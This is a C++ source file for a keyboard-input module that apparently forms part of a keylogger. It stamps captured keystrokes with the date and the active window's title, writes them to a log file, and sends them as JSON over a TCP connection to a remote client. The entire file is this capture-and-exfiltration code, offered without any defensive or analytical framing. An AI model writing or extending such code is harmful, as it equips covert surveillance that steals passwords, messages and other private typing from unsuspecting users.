#include "InputKeyboard.h"

boost::chrono::system_clock::time_point InputKeyboard::LastKeyboardActivity = boost::chrono::system_clock::now();
std::string InputKeyboard::PreviousWindow = "";

InputKeyboard::InputKeyboard(void)
{
}

InputKeyboard::~InputKeyboard(void)
{
}

void InputKeyboard::format(std::streamoff logSize)
{
	std::string activeWindows = StaticTools::GetActiveWindowTitle();
	_format = "";
	boost::chrono::duration<double> diff = boost::chrono::system_clock::now() - LastKeyboardActivity;

	if (PreviousWindow != activeWindows) {
		if (logSize > 0)
			_format = "\n";
		_format += StaticTools::GetDate() + " | " + activeWindows + " | ";
		PreviousWindow = activeWindows;
	}
	else if (diff.count() > 1.f) {
		if (logSize > 0)
			_format = "\n";
		_format += StaticTools::GetDate() + " | " + activeWindows + " | ";
	}
	LastKeyboardActivity = boost::chrono::system_clock::now();
}

AInputType &InputKeyboard::operator>>(LogFile &logger)
{
	logger << _format << _data << std::flush;
	return (*this);
}

AInputType &InputKeyboard::operator>>(TCPClient &client)
{
	JSONBuilder builder;

	builder.addValue("type", "cmd");
	builder.addValue("name", "key");
	builder.addValue("param", _format + _data);
	client << builder.get();
	return (*this);
}